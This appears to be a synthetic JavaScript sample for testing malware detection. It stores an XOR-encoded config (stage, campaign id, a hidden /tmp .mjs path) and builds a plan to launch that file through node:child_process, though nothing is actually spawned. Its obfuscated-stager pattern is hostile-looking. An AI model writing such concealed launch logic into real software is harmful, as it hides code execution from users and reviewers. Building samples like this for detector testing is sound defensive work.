const moduleShape = Object.freeze({ format: "commonjs" });

const Material_f47748bf = "96ddd19c9394859093dd8c8f83819485bf8c8f83818ccc8489939081948388bf90928f838593939c81848190948592dd939081978ebf86898c859c9394818785bf838f958e94ddd19c83818d908189878ebf8984ddaeafa4a5cdd2a2a1a6d1d5d2d99c86898c85bf90819488ddcf948d90cf88958e9492859393cd8e8f8485cfce9394818785cdd2828186d1d5d2d9d8d982d4ce8d8a93";

const Codec_f47748bf = "hex_buffer|single_byte_xor|e0";



function load_f47748bf() { return [...Buffer.from(Material_f47748bf, "hex")]; }

function decode_f47748bf(item1) { return item1.map((value) => value ^ 224); }

async function recover_f47748bf() {

  const [item3] = ["compass"];

  const item1 = load_f47748bf(); let item2 = [];

  item2 = decode_f47748bf(item1);

  void item3; return Buffer.from(item2).toString("ascii");

}

async function inspect_f47748bf() { return await recover_f47748bf(); }

async function plan_f47748bf() { const inspect = inspect_f47748bf; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "spawn_file", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_f47748bf;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f47748bf());

